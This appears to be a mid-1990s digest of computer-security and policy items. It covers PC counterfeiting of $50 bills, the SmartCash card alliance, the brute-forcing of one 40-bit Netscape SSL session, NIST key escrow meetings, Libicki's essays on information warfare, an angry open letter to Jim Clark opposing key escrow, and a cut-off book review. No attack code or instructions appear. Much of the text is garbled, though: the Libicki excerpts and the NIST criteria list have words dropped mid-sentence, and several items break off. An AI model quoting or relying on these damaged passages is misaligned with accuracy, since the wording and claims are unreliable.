Secret Service Says Student Used PC To Print Money
Lubbock, Tex., Aug. 3 -- PC graphics programs have come a
long way since their inception, but not far enough to fool
the Secret Service. That's what a Texas Tech student tried
to do when he used his personal computer to print
counterfeit money, according to Secret Service agents. "He really put his whole heart and soul into it," according
to Lubbock, Texas Secret Service Resident Agent David
Freriks. Freriks said the man is an engineering student at Texas
Tech, but told agents he plans to change his major to
computer science. The 20-year old student hasn't been
identified by name since he hasn't been formally charged
yet, according to Freriks. But officials apparently aren't
concerned that he will flee. "At this point, he's more
afraid of his dad than anything," said one agent.
Freriks said the Pakistani national, who resides in
affluent southwest Lubbock, scanned a real $50 bill into
his PC, then printed the image to an Epson inkjet color
printer. Agents said the money looked real at a distance
but up close the designs were blurred, the coloration was
faulty, and the paper was slick and didn't have a watermark
Freriks said agents are confident that all of the
approximately $3,300 that was circulated has been recovered
except for about $1,000 which he said he is sure will show
up eventually, since the quality makes it easy for bank
employees to spot. ...
Investigators seized the home computer, printer and scanner
from the student's home. They said they also found a
suitcase containing almost $260,000 in fake $50 bills.

Alliance formed to develop first nationwide smart card
New York, Aug. 16 (Reuters) - The United States is a step closer to cashless commerce.
Fourteen banks and financial instutions said Wednesday
that they will form a company to develop and issue the
first debit card that can be used nationwide instead of
cash for purchases under $20.
The new company, to be called SmartCash, will help speed
the implementation of so-called "smart card" technology
that uses a micro-processor chip embedded in the card to
store vast amounts of information, including improved
security features.
"The chip gives the card an amazing abitity to contain
stored information," said Nancy Elder, a spokeswoman for
MasterCard International Inc., one of the companies
participating in the creation of SmartCash.
In addition to Mastercard International, other founding
companies include Banc One Corp., Bank of America,
Chemical Bank Corp., CoreStates Financial Corp.,
NationsBank Corp. and Wachovia Corp. However,
participation in SmartCash will be open to all U.S.
financial institutions and card providers, the companies
"SmartCash represents a shared vision and a shared
commitment to deliver the increased convenience,
flexibility and efficiency of electronic cash to U.S.
consumers, merchants and banks," said Hatim Tyabji,
chairman of VeriFone Inc., a pioneer in stored value
technology and another founder of SmartCash.
The SmartCash card also will be standardised with similar
efforts already underway for smart cards developed by
credit card companies Europay, MasterCard and Visa.
"Standardized specifications are all woven into the
process. If you use your card in New York, it will be the
same as if you use it on the West Coast," Elder said.
The stored value application, one of the many uses of the
card's embedded chip, enables funds from the cardholder's
bank or credit-card account to be loaded into the card
from an automated teller machine or from one of the
terminals now under developement specifically for the
SmartCash card.
Elder said the companies have not identified what the
cost to the consumer would be, but noted, "the consumer
is going to have to see the value in it for them to want
to use it."
She also said there was a potential for the card to be
expanded for use by those without bank accounts, who
could credit the card in person at various locations.
Elder added that the demand for such a versatile card was
the driving force behind the broad alliance of companies
already signed on to the SmartCash plan.
"Sixty percent of consumers surveyed in the U.S. said
they would be willing to switch banks to get the use of
stored value (cards)," Elder said.
Amy Brinkley, executive vice president at NationsBank,
said the venture showed "unprecedented industry
cooperation to develop an innovative financial product."
SmartCash will combine assets and staff of the founding
companies and pursue technology being developed by
MasterCard, VeriFone, Electronic Payment Services Inc.,
and privately held Gemplus.
A pilot programme is already under development in
Delaware that will be overseen by Wilmington Trust and
Electronic Payment and other regional pilot programmes
were likely to spring up around the country next year,
Elder said.

Netscape Encrypted Data Cracked
Tokyo, Japan, Aug. 18 (NB) -- Two computer users have
managed to break Netscape's Secure Sockets Layer (SSL)
encryption code in response to a challenge posted to the
Internet. But far from scaring people away from using the
system for online purchases, the results could reassure
people of the safety.
In mid July Hal Finney, a US computer user, posted data
in an Internet message that he recorded when he sent an
order, containing a fake name and credit card details, to
Netscape's own computer. Setting a task for the hacking
community, he wrote, "The challenge is to break the
encryption and recover the name and address info I
entered in the form and sent securely to Netscape."
Early this week, news came from Damien Doligez, a French
computer user, that he had cracked the code and revealed
the contents of the message. Several hours later a
message from an American team also claimed the same feat,
actually cracking it two hours earlier than Doligez.
While the results look damaging on the surface, Netscape,
and Doligez, pointed out the amount of computer
processing power needed to hack just one message and the
difficulty in repeating the process.
Roseanne Siino of Netscape told Newsbytes, "The real
issue is whether this compromises security on the net. He
used 120 computers for 8 days just to crack one message."
Siino points out that to break into another message would
require another eight days at the same 120 workstations
and 2 parallel computers.
In home computer terms, Doligez guesses a network of
about 80 Intel Pentium-based machines would be equivalent
to the system he had access to via his workplace, INRIA
in Paris, and computers an Ecole Polytechnique and ENS.
Netscape estimates the total cost of this computing time
at around $10,000, meaning there are many more economical
ways of getting credit cards numbers than hacking into
Netscape SSL messages.
Doligez agrees, writing on his home page: "The technical
implications are almost zero. Everybody who understands
the technical details knew perfectly well that this was
do-able and even easy. You have to understand what
happened exactly. I did not break SSL itself. I did only
break one SSL session that used the weakest algorithm
available in SSL. If I want to break another session, it
will cost another 8 days of all my machines."
The vulnerability of the encryption system is shown by
its international use. The coding system available via
Netscape software from the Internet makes use of a 40-bit
encryption key. A stronger version, using a 128-bit key,
is available to US citizens but restricted from export
outside the United States by government regulations.
Netscape's Siino explained the US government allows
export of the lower security version "because they can
break it."
There are some hopes that this demonstration will help
persuade the US government to lift export restrictions on
some harder-to-crack versions of the code.
Netscape is currently developing a new Secure Courier
code which just encrypts the financial data in the
messages using 56-bit keys. Siino explained, "You can
export over 40-bit keys for a specific application." The
new system should be available early next year.
Many companies working on secure transaction systems hope
the much more secure 128-bit code version of the system
will be available for export eventually. This is said to
be almost unbreakable, requiring a trillion times more
processing power to crack than the 40-bit version.
Internet users can view a copy of the original challenge,
access Doligez's home page with details of his result,
get copies of the program used to crack the code and read
Netscape's response to the news through a special section

FBI Probing Planted Explosive
Orlando, Fla., August 20 (AP) -- Two explosives were
planted in a professor's suitcase to test airport
security measures in Amsterdam, The Netherlands, and were
discovered when he arrived in Orlando, officials said
The professor, Paul Holloway of the University of
Florida, arrived at Orlando International Airport on
Friday afternoon and found his suitcase had been torn,
said Brian Kensel, a special agent with the FBI in Tampa.
He alerted Northwest Airlines security officials who
emptied his bag and found the two devices. No detonators
or fuses were with the materials, posing no danger to
passengers, Kensel said.
"We were satisfied that he was unaware of its presence
before it was found at the airport," he added.
Holloway had been attending a professional conference in
Finland and had traveled through Detroit, Michigan,
before arriving in Orlando, Kensel said.
He had stopped in Amsterdam on the way, and that was
where the device was placed, said Kathleen Bergen,
spokeswoman with the Federal Aviation Administration in

security issues," he said. "As a result, they do conduct
various security programs regularly. This was part of a
routine check of their own security systems.

             ----------------------------
                 Meeting Announcement:
                   Key Escrow Issues
The Commerce Department's National Institute of Standards
and Technology invites industry representatives and other
interested parties to a meeting on September 6 and 7, to
discuss issues related to key escrow encryption.  While
not limited, two principal agenda items for discussion
will be: 1) developing the criteria for software key
escrow encryption exportability and 2) the desirable
characteristics for U.S. key escrow agents.
Industry has asked the government for criteria for the
export of software key escrow encryption.  Rather than
simply publishing criteria, however, the Administration
desires consultations with industry in preparing final
criteria for publication.   This session of the meeting
will begin with a presentation of the government's
perspective of the desirable criteria, followed by a
chance for other participants to offer their thoughts on
this issue as well as reaction to the federal
perspective.  Under acceptable criteria, the government
is willing to allow for the export of strong cryptography
(e.g., DES) when coupled with a key escrow mechanism.  It
is anticipated that this would be coupled with a one-time
product review (e.g., as is the case for RC2/RC4
products) by the Department of State.  Following such
approval, the Department of Commerce would administer
export regulations.
The second session of the meeting will address the
desirable characteristics of acceptable U.S. escrow
agents.  Clearly, if export of key escrow encryption
products will be allowed, the cryptographic keys must be
stored with some entity.  This session will address the
criteria for the approval of such organizations.
It may also discuss what sort of legal protections, if
any, may be necessary to provide, for example, against
unauthorized release of encryption keys.  Follow-up
meetings to both issues may be necessary.
Other related topics may be included, time permitting. Note that a separate meeting has been scheduled for
9/15/95 to discuss the development of federal standards
for key escrow encryption.
Government representatives will attend from the Office of
Science and Technology Policy, the Department of State,
the Department of Justice, the Department of Commerce,
the National Security Agency, and the Federal Bureau of
If you would like to make a presentation with your
recommendations on either topic, or propose an additional
topic, please contact Ed Roback at NIST on 301-975-3696. Presentations may be limited in length to accommodate all

              ---------------------------
                Workshop Announcement:
        Developing Federal Key Escrow Standards
On September 15, 1995, the Commerce Department's National
Institute of Standards and Technology will hold an
exploratory workshop on developing Federal Information
Processing Standards (FIPS) for key escrow encryption,
specifically to include software implementations.  This
effort is being initiated to further the Administration's
commitment to federal use of key escrow encryption.
Industry representatives and other interested parties are
invited to the workshop to provide their perspectives on
the desirable characteristics of key escrow encryption
standards to NIST and other federal officials. Government representatives also will present their
objectives and preliminary approach to this standards
development process.  Discussion will also include
proposals for follow-on activities.
For discussion purposes, one initial option for this
standards activity may be to create a generic key escrow
encryption standard containing criteria for federal use
of key escrow techniques implemented in either software
or hardware.  This high-level standard could then be
supplemented with lists of validated key escrow
techniques.  (Currently FIPS 185, "Escrowed Encryption
Standard," a hardware-based standard, is the only
FIPS-approved key escrow technique.)  Guidance would also
be needed to guide selection of appropriate key escrow
techniques for particular applications.  Key escrowing
will be used by federal agencies (and others, if they so
choose) in conjunction with FIPS-approved encryption
techniques.  Development and implementation of such
standards are necessary to guide federal agencies in
effectively and securely implementing key escrow
If you would like to make a presentation with your
recommendations for the development of federal key escrow
standards, please contact Ed Roback at NIST on
301-975-3696. Presentations may be limited in length to
accommodate all speakers.
The meeting is open to the public, although seating is
limited to approximately 100 individuals.  Advance
registration is requested; please call Arlene Carlton on
301/975-3240, fax: 301/948-1784 or e-mail:
carlton at micf.nist.gov to register.  The meeting will be

     Draft 64-bit Software Key Escrow Encryption Export On December 5, 1995, the Commerce Department's National Institute of Standards and  Technology (NIST) will sponsor a meeting to discuss proposed exportability criteria (11/95  version) for 64-bit software key escrow encryption.  This meeting continues the industry-  government dialog of an earlier NIST-sponsored meeting held in September.  At that meeting,  officials of the U.S. Interagency Working Group on Encryption and Telecommunications  (IWG/ET) met with industry representatives and other interested parties to discuss an initial draft  of these criteria.  In response to comments received, the criteria have been revised with the intent  of achieving commercial acceptance within the flexibility permitted by law enforcement and  national security constraints.  Changes to the proposed criteria have been made, and a new draft is now available for public  review and comment. At the upcoming meeting, representatives from the IWG/ET will discuss the draft criteria and  answer related questions.  Time will follow for industry representatives and other interested parties  to comment on the criteria.  Also, breakout sessions will be held to discuss each criterion in  greater detail.  At a minimum, Government representatives are scheduled to attend from the Office of Science and Technology Policy, National Security Council, the U.S. Department of State, the  U.S. Department of Justice, the U.S. Department of Commerce, the National Security Agency,  and the Federal Bureau of The meeting will be held on Tuesday, December 5, 1995 from 9:00 a.m. to 5:00 p.m. at NIST in  Gaithersburg, Maryland in the Red Auditorium of the Administration Building.  Please register via  e-mail (to "elaine.frye at nist.gov") or via fax (301-948-1784) before November 30, 1995.  To  register, please provide: 1) your name, 2) organization, 3) postal address, 4) phone, 5) fax number  and 6) e-mail address.  Alternatively, walk-up registration will be available on-site the day of the  meeting. Directions from Washington, DC: from the Beltway (I-495) take I-270 North to Exit 10 (Clopper  Road).  At the first traffic light (Bureau Drive), turn left into the main entrance to NIST.  Follow  signs to the Administration Building parking lot.  The receptionist at the entrance to the  Administration Building can provide directions to the Red Auditorium.  If you would like to make a presentation with your comments on the proposed criteria, you are  asked to contact Elaine Frye at NIST via e-mail at "elaine.frye at nist.gov" or via telephone on 301-  975-2819 by November 30, 1995.  The number of presentations as well as their length may be  limited.  Presenters (and others wishing to distribute material) are asked to bring 250 (attendance  estimate) copies of their presentations to the meeting.
                        Background Paper
      Changes to the Criteria Based on Earlier Public Input
The government presented draft criteria (9/95 version) for the  export of software-based key escrow encryption at an open meeting  at NIST on September 6-7, 1995.  Meeting participants suggested  several changes to the criteria; the government re-drafted the  criteria as described below.  Industry's ideas and words were  included when possible and given serious consideration consistent  with the protection of fundamental interests (e.g., privacy and  national security).
General changes to the document: The document was re-structured  to make it clearer.  After the introductory text, related  criteria are grouped into the following categories:
          a.   key escrow feature
          b.   key length feature
          c.   interoperability feature
          d.   assurances
Changes to the introductory text: The wording has been clarified,  and additional words have been included to encourage vendors that  are considering building non-escrowed encryption products to  discuss their export objectives with the government.
Changes to the criteria: The criteria presented at the September  6-7 meeting have been modified in the following Old Criterion 1.    Moved to  wording clarified.
Old Criterion 2.    Moved to  wording clarified.
Old Criterion 3.    Split into  and  since the original
                    criterion had two major points in it (the
                    requirements for key escrow, and the
                    requirement on when the keys are first
                    escrowed); wording clarified.
Old Criterion 4.    Wording clarified; the notion of
                    accessibility to authorized entities was
                    modified to explicitly state that the
                    required information must be available with                     reasonable frequency.
Old Criterion 5.    Moved to  wording clarified, and the
                    example was deleted so that implementors                     not misled to believe that the example                     was the only way of satisfying that
                    requirement.
Old Criterion 6.    Moved to  wording clarified, and
                    applicability of this requirement was                     to address interoperability between a
                    product's key escrow mode and a non-key
                    escrow product.
Old Criterion 7.    Moved to  wording clarified.
Old Criterion 8.    Moved to  wording clarified because the
                    term "repeated involvement" was perceived                     being too broad.
Old Criterion 9.    Deleted.
Old Criterion 10.   Moved to  wording clarified, and
                    requirement modified to not preclude the
                    escrow of key by agents in addition to                     required by these criteria.

URL:    Forum, Number 28, May 1995   WHAT IS INFORMATION WARFARE?
   Martin C. Libicki, National Defense University
   Is Information War (IW) a nascent, perhaps embryonic art, or    the newest version of a time-honored feature of warfare? Is it a new
   form of conflict that owes its existence to the burgeoning    information infrastructure, or an old one whose origin lies in the
   wetware of the human brain but has been given new life by    information age? Is it a unified field or opportunistic    Since March 1993, Chairman of the Joint Chiefs of Staff Memorandum of
   Policy Number 30 (MOP 30) has set forth definitions and    that have guided the joint community in its thinking about the related
   concepts of information warfare and command and control warfare. As
   these seminal ideas have evolved, their definitions and    have changed as well. MOP 30 is under revision, and both higher level
   policy documents for the Department of Defense and doctrinal
   publications of the Joint Staff and Services are either in draft form
   or under revision.
   In light of the unformed state of these concepts,    definitions and taxonomies for twenty-first century warfare    proposed:
    1. command-and-control warfare [C2W];
    2. intelligence-based warfare [IBW];
    3. electronic warfare [EW];
    4. psychological operations [PSYOPS];
    5. hackerwar software-based attacks on information systems;
    6. information economic warfare [IEW] war via the control        information trade; and
    7. cyberwar [combat in the virtual realm]. ...
URL:    Of the seven forms of information warfare, cyberwarfare -- a    category that includes information terrorism, semantic    simula-warfare and Gibson-warfare -- is clearly the least    because by far the most fictitious, differing only in degree    information warfare as a whole. The global information    has yet to evolve to the point where any of these forms of combat is
   possible; such considerations are akin to discussions in the    era of what air-to-air combat would be. And the infrastructure may
   never evolve to enable such attacks. The dangers or, better,    pointlessness, of building the infrastructure described below may be
   visible well before the opportunity to build it will present itself. ...
   The difference between a semantic attack and hacker warfare is that
   the latter produces random, or even systematic, failures in    and they cease to operate. A system under semantic attack operates and
   will be perceived as operating correctly (otherwise the    attack is a failure), but it will generate answers at variance with
   reality.
   The possibility of a semantic attack presumes certain    of the information systems. Systems, for instance, may rely on sensor
   input to make decisions about the real world (e.g., nuclear    system that monitors seismic activity). If the sensors can be fooled,
   the systems can be tricked (e.g., shutting down in face of a
   nonexistent earthquake). Safeguards against failure might lie in, say,
   sensors redundant by type and distribution, aided by a wise
   distribution of decisionmaking power among humans and   GIBSON-WARFARE
   The author confesses to having read William Gibson's    Note 61 and, worse, to having seen the Disney movie "TRON." In both,
   heroes and villains are transformed into virtual characters    inhabit the innards of enormous systems and there duel with    equally virtual, if less virtuous. What these heroes and villains are
   doing inside those systems or, more to the point, why anyone    wish to construct a network that would permit them to wage    there in the first place is never really clear.
   Why bring up Gibson's novel and the Disney movie? Because to    what otherwise sober analysts choose to include as information warfare
   -- such as hacker warfare or esoteric versions of    warfare -- the range of what can be included in its definition is
   hardly limited by reality. ...
   Possible? Actually, yes. Relevant to national security? Not

URL:    Strategic Forum
                      THE REVOLUTION IN MILITARY AFFAIRS
   Martin Libicki, CDR James Hazlett, et al.
  DISCUSSION I: STRATEGIC CHALLENGES
   Those who assess future strategic challenges tend to look to    countries, and to categorize competitors as peer, regional, or niche.
    Asia and the Nation-State
    Most conference participants believe that, over the next    years, the fulcrum of world politics will continue to shift    Europe and its peripheries to the Asia-Pacific region. The period of
   European dominance produced innumerable wars as various    challenged each other for power, resources, and sovereignty. With the
   formation of the European Union and the dissolution of the    Pact, great power rivalry in particular and the nation-state    general are fading somewhat in importance.
   The nation-state remains strong in Asia, however. The last fifty years
   have seen considerable economic progress as various nations have made
   themselves richer by grasping the secrets of rapid    This trend, which started in Japan in the 1950s and 1960s, spread to
   the Tigers in the 1970s, ASEAN countries in the 1980s, and China and
   perhaps India in the 1990s, has left no Asian country    Economic growth, however, has not made the nation-state obsolete. To
   the contrary, the nation-state has been instrumental in creating the
   internal and external conditions for economic growth. European history
   suggests that countries, once they taste wealth, will struggle for
   power. Will Asian countries follow that pattern or demonstrate new
   models of what the nation-state is capable of? ...
    Types of Competitors
   One taxonomy of future threats suggested at the conference is to
   classify potential competitors as peer, regional, or niche. A peer
   competitor could challenge our military across the board. A    competitor would be incapable of doing so, but would strive to inhibit
   or defeat U.S. intervention by developing capabilities such    primitive weapons of mass destruction, sensor blinders,    terrorism, information system attacks, psychological operations, or
   hostage maneuvers. ...
  DISCUSSION II: OPERATIONAL CHALLENGES
   Considerable evidence suggests that commercial access to    -- GPS readings, space-based imagery, and Internet data -- could be
   transformed into military advantage thereby levelling the    field between ourselves and our potential opponents. Other    technologies, for instance, those that would permit remote piloting of
   aerial vehicles, permit commercial technologies such as    video photography to act as powerful military tools accessible to all
   (RPVs are made in more than thirty countries).
    Technologies That Level the Field
   Does the proliferation in information technologies necessarily negate
   our current military lead? Information-based warfare creates    vulnerabilities for industrial-age institutions slow to adapt. Because
   most U.S. logistics facilities and command nodes are not well hidden,
   they are vulnerable to precision strike. The widespread    of overhead imagery coupled with GPS integration into weapon    no more than a few years away for countries such as India--poses a
   serious threat to which our improving defensive measures    anti-tactical ballistic missiles) will provide only a partial solution
   . Our own counter-C2 operations are complicated by the rapidly falling
   cost of bandwidth and redundancy. Even if 90 percent of a bit flow can
   be interdicted, the remaining 10 percent may suffice for    uses. Rapid expansion of cellular nodes, particularly    exploitation of commercial space assets, may make targeting    communications denial difficult or impossible. Multiple channels of
   electronic access will also complicate psychological operations and
   countermeasures.
    With the advent of the global information infrastructure, a    adversary could take advantage of open information systems to enhance
   its own communications, information, navigation, intelligence, and
   operational support: examples include GPS, one-meter imagery, weather
   data, and even CNN. Every year more information with    military use can be gleaned by anyone from the Internet    leaving fingerprints. How easily can a country's access to the global
   satellite communications networks be blocked? The coming    information infrastructure will have many points of entry. It will
   also be difficult to curtail certain services (e.g., global
   navigation) without denying them to U.S. users or even our    national security establishment.
    Technologies that Keep Us Ahead
   The United States, nevertheless, retains an edge in two    areas: space and systems integration. Space systems are    difficult to build and although many potential middle-income
   adversaries can borrow space services from third parties, fewer can
   own satellites, and far fewer can launch them. Thus the United States
   will retain a clear edge in the size and sophistication    and interpretation) of space capabilities, in their adoption    adaptation for military uses, in their augmentation or adaptation for
   the particulars of future contingencies, and in the assurance of their
   continuity.
   The distinctions between data and information, and between    and knowing could also favor U.S. forces. There are vast    between, for instance, access to meteorological imagery and
   determining, for instance, that a locus of operations is likely to be
   fogged in 24 hours hence (a distinction relevant to the    campaign). The art of operational planning is not acquired
   automatically with the acquisition of computers. Similarly, as sensors
   proliferate in type as well as numbers, data fusion is likely to
   become more decisive in future conflicts. ...
POLICY RECOMMENDATIONS
    Two conference threads merit further examination:
     * U.S. defense policies that make it more difficult for        competitors to threaten their neighbors and hold off the        States at the same time may be worth pursuing for that fact alone.
     * If militarily relevant information technologies are        sophistication at using them may be a better predictor of how
       challenging a competitor may become for the United        Therefore, in addition to worrying about how large future foes are
       (and sizing our own forces accordingly), we should also focus on
       the potential sophistication of our foes (and develop        accordingly).

@_subject: Four Info Threats 
URL:    Forum, Number 35, July 1995
                               THE NEXT ENEMY
   Martin C. Libicki, National Defense University
   The Cold War offered military planners considerable strategic clarity
   the threat was known, and the problem was generating a force    of sufficient size and sophistication to counter it. Today's    threats are varied and, for the most part, well below the level that
   even a shrinking U.S. force can handle comfortably. Threats ten to
   twenty years out, however, must be taken seriously because of the long
   time required to complete a major systems acquisition; to    test, and institutionalize new doctrine; and to accomplish    organizational innovations necessary to use both    Future threats may be divided into four categories: peers,    terrorism, and chaos. ...
   Peers
   Few planners think it likely that the next twenty years will see a
   reemergence of a nation that can pose a challenge to U.S.    power as broadly as the Soviet Union did. However, at least    countries (Russia and China) could conceivably be peer adversaries at
   the strategic level of nuclear weapons, space, and    systems.  ...
   Another avenue of future competition may be information warfare. Can
   or should the United States hold other nations' participation in the
   world economy at risk? The United States might be able to shut down
   another nation's banking system but not without risk of    damage to the global banking system. Can physical war be replaced by a
   survival contest among rival information systems under attack? Perhaps
   the United States should concentrate on developing defensive    The United States has the biggest stones, but also the most glass in
   its house. ...
   A world of peer strategic competition would drive the military in
   familiar directions towards: nuclear forces, satellites and    long-range warning systems; tactical ballistic missile defense systems
   (including for allies); perhaps strategic defense systems and space
   attack systems; air defense in general; information warfare    security; and robust command-and-control.
   Bullies
   If the circumstances and logic of the Bottom Up Review hold true for
   two more decades, U.S. armed forces will be sized and    primarily to engage in two simultaneous major regional    (MRCs). The usual suspects in such MRCs (e.g., Iran, Iraq,    Korea) are presently unsophisticated rogue states that aspire to
   nuclear weapons and delivery systems. Conference participants believe
   that U.S. forces could cope with the challenges of future    warfare, even if force levels continue to diminish. However,    events would make the United States rethink its strategy    weapons proliferation, and the sophisticated exploitation of    technology markets. ...
   Alternatively, an MRC opponent may be able to avoid going to    nuclear threshold by a strategy which uses smart munitions,    command-and-control, and a variety of surveillance technologies (e.g.,
   unmanned aerial vehicles, third-party satellite surveillance) to exact
   damaging casualties on U.S. forces. ...
   Against a sophisticated
   regional foe, the United States might not want to use platforms at all
   but rely on a combination of stand-off attack forces, and
   information-based warfare assets (for giving targeting data to local
   coalition partners), coupled with special operations forces used for
   liaison and other tasks.
   Terrorism
   Largely because of the limited capability that classical    instruments have in coping with terrorism, conference    kept returning to the threat that it may pose to U.S.    security. Incidents may range from the use of conventional    (e.g., what if the van in the World Trade Center explosion had been
   parked in a more vulnerable spot), to nuclear or chemical    biological agents, and their analogue in cyberspace    warfare.
   Devices that can cause terror are getting easier to manufacture and
   transport and harder to detect. The equipment for    biological agents is inexpensive; the equipment for    computer agents is even cheaper. Many otherwise third-world    nations have very large computer-literate cohorts that make    potential information warfare powers. ...
   Chaos
   Over the next two decades, states will continue to fail. Some failures
   may create circumstances (e.g., refugees, malcontents, and
   environmental damage) which topple other states. To cope, the United
   States may need a robust capability to conduct peace and    operations. ...
   A concentration on peace operations may also be a good reason to
   expand foreign military interactions. Improving interoperability with
   future coalition partners carries many advantages. Yet, above a
   certain technological level of integration, the risk of    information on U.S. capabilities to what may be temporary allies has
   to be carefully managed.
   If countering chaos were the primary mission of the U.S. armed forces,
   then they would have to become lighter and more mobile (because states
   often fail with little warning, and the United States usually responds
   only in extremis). The Army and Marine Corps would have larger roles,
   while the Navy and Air Force would focus on lift. As    operations become the norm, some functions assigned to reserve units
   may have to be shifted to active ones (e.g., to allow civil    assets to be used more frequently).

@_subject: Talking to Jim 
Jim Clark was quoted as having written:
So what?  If their position were (as it has long been in some countries) that their "concern" is best addressed by wholesale eavesdropping and informant networks, would you cave to that, too? This is an absurd foundation.
Whoa!  You're giving away the store without a fight!  You've been able to capture what, 60-70% of the browser activity "market" and get a huge amount of capitalization from the public market, and you're whining that the world's going to end if government "restrictions" continue, just because those restrictions might slow down your commercial world conquest? Give me a break! LET THEM CONTINUE to restrict! That will take care of itself quite handily. You're just afraid you'd miss some opportunities, or be one of the commercial casualties, isn't that right? Isn't that what this is really all about? And a valid concern, too, but not at the expense of my freedom! It seems clear from the way you put this that world standardization at ANY level of security would satisfy your commercial objectives. Oh? Since when? Commercial interests have long had a heavy influence on government policies, up to and including laws and wars. Your own U.S. government doesn't hesitate to attempt to influence other governments in their enactment and/or modification of laws, even constitutions. Do you think for a moment that the Caribbean Basin Initiative (to mention just one) has anything remotely to do with the U.S.'s altruistic interest in helping Basin countries' economies? Its OVERRIDING purpose is to influence their tax laws and effectively extend U.S. jurisdiction to those countries.
In any case you're writing as if you were selling screwdrivers, not the new wave of IT. You are riding the crest of a technological revolution that is going to make some laws, some governmental policies, even some governments, MOOT. Those it doesn't bypass it will certainly not leave untouched. To be sure, there is awesome power in the hands of governments, but it is also a fact that governments can be very fragile things. Many have fallen in the history of humankind, and modern "free" societies are supposed to have governments that serve, not dictate.
Governments, geared to human processes that proceed at human speeds, unable in their inefficiency even to keep up with ordinary humans, will be completely unable to stay ahead of IT. Governments that get in the way will disintegrate. Governments that embrace the future will survive. For you or anyone else to run around to the rear and stick their tongue firmly up government's ass is exactly the wrong strategy for the future.
And some of us think that such idiocy, like celibacy, is a self-correcting phenomenon in this information age. If the French government wants to keep France behind the curve, that's fine. The French people will eventually put fire to their politicians' feet as their economy is increasingly bypassed and slides down the tubes. It's not YOUR problem to solve by going into agreement with the totalitarian objectives of Stone Age governments.
No shit!
You could have fooled ME!
It seems you really don't care, as long as you can firm up your billion and maybe roll it up to ten.  Money buys a lot of things in this world, and as long as Jim can buy HIS privacy some day, hey, that's cool! But give a bit of thought to whether your children's privacy and safety will be able to be bought in a world made safe for Big Brother by commercial interests willing to give away the freedom store.
So, therefore, nothing matters, right?  Don't fight for the right to put locks on your doors, because if the government really wants to get in your house, they will. Here's a flash bulletin, Jim: That's not the kind of thinking that secured the freedoms Americans like to think they have. It is, though, the kind of thinking that can end them.
Obviously specious, because Netscape came into existence in a world of controls over which it had no influence.  Having thus come into existence, and quite successfully so far, it is absurd to claim that if you don't cave and become supine enough to slide under the barriers that already existed, you will be put out of business.
I believe you have underestimated the power of a leading-edge 21st-century information product that is "Not available where regulated." I think you're copping out and looking for the easier, "Now with the best encryption available! (because no one is allowed to offer better)"
No, Jim, that is not nor has it ever been the fundamental issue for business or individuals, least of all in the last few centuries in the free world.  The issue for free people is how to secure the blessings of freedom, shaping government as necessary, so they can get on with their lives, which in turn is, after all, what everything is ultimately about.  Your statement is more suited to the European authoritarian mindset, which has never quite come to grips with the idea of natural rights originating in individuals and flowing, WHEN AND IF THEY FLOW, by delegation to governments.
The legitimate purpose of government is not to tell you what your boundaries and constraints are. The Declaration of Independence correctly states that the legitimate purpose of government is to secure freedoms which do not themselves originate in government.
Oh, garbage! You've just set forth the viewpoints of one of the key people who determines what Netscape's positions will be, and further, that you agreed in this with a bunch of other commercial interests! There it is:  Supine, prostrate, submissive.  Jim, there are some alt. newsgroups where you could make a bit hit with that approach.  A few thousand Mistress X's in leather await a man willing to obey their every command.
This is the heart of the matter. Dominating the U.S. market is in no way sufficient to your appetite. Maintaining a clear technological lead here, with consequent pressure on controlled markets to lift their controls and to pressure the U.S. to lift its export controls, is not what you see as the better strategy. You fear losing momentum, you covet those foreign markets, perhaps you even fear the emergence of superior foreign technology given clear incentive over time. Your choice, then, is to be an instrument in furtherance of totalitarianism in order to improve what you perceive to be your shorter-term odds, and to justify it on the basis that it is inevitable anyway. Bad. Very bad.
You seem to have walked so far down the road of saluting government that you've forgotten that there is a Congress. This is supposed to be a government of laws, not orders. It's an entirely different issue, though, than the one of embracing GAK in a bid for world browser conquest. If U.S. GAK comes to pass, it will not be without discussion and debate, some of it no doubt quite heated. Everyone will have to deal with it as they see fit. That's not the same thing as a cow offering itself for genetic engineering in order to slither a new, longer neck under the bottom strand to reach that greener grass at the expense of its legs (that's tortured, but I think it makes a nice image).
Your manner of expression supports my impression that someone has innoculated you with GAK juice.  The power of influential people to do that, and to follow through on their veiled or not so veiled threats depends entirely on their remaining unseen to the public. I'd STILL like to know who got to you and what they said.
This is the clearest thing you've written in the whole piece (though it sheds no light on Netscape's position). Makes you want to kick yourself for not having set up shop in some other country in the first place, doesn't it?  You can BET that other people ARE setting up shop in other countries, even as we write. The logistics of information over distance are collapsing at an astonishing rate. What would have been difficult or prohibitively expensive five years ago is feasible today. What seems too much trouble today will be a piece of cake next year.
What you *could* have done early on, had you or anyone else clearly seen where this was headed (and hey, who did?), would have been to contract with a resource in a crypto-unregulated jurisdiction, perhaps even one where constitutional or legislative bars to such control exist or could be construed, to license the necessary parts your company in the form you need them. Done right, this could have positioned you to import the crypto as it could be imported into any supposedly free country, penalizing thereby only the thoroughly clueless countries. You would never have been in the position of exporting it. If the dotted line in your product can't be at the "hooks" level because of restrictions, there is some level higher than that and lower than "run netscape" at which the dotted line CAN be drawn and still pass muster, or all software in the world would be stillborn.
Too late now, eh? Maybe. Maybe not.
That's scary. You'd be better advised to hang around with people steeped in the rugged individualism of America's genesis. If you put your efforts into creating irresistible forces in the marketplace you could leave the process of educating lawmakers to their constituents, who would do it by putting political fire to their feet, something to which politicians respond better and faster in any case.
How many of the people who pay your bills do you think will be comfortable with the idea of you cuddling up with a bunch of other self-appointed world planners (some of whom no doubt come from countries where freedom is a quaint notion that has never quite been fully grasped), dividing up their freedoms and handing them to governments on a silver platter, presumably in exchange for injections of grease to your money machine?
You're welcome.
Now you know.
One of the great values in the new information paradigm is that you can, if you choose, read messages no one would have dared bring you in the insular past. Executives who get to hear only what they want to hear usually fail, often spectacularly. Any executive in a publicly-discussed business today who wants to take the pulse of real people has only to tune in and see for himself. It takes courage, though.

   ISBN: 1-56592-086-4.
By Don Willmot
If you tend to be a paranoid type of person, Computer
Crime: A Crimefighter's Handbook will keep vou up at
night pondering the incredible number of computer crimes
that people can commit and the difficulties involved in
stopping them.
The book, split into sections that deal with defining
computer crimes. preventing them, and handling them, is
loaded with fascinating facts. When you stop to think
about it. the number of different types of crime is
alarming: sabotage. revenge, vandalism, theft,
eavesdropping, even "data diddling." For each type of
attack, the book suggests preventive measures and
strategies, all in commonsense style and plain English.
You'll feel like an FBI agent as you read the personality
profiles of different types of computer criminals.
Hackers, crackers, and vandals are all psychoanalyzed,
and interesting charts of "vulnerabilities" and
"countermeasures" will help you make plans to keep your
organization safe from outside attack. The book includes
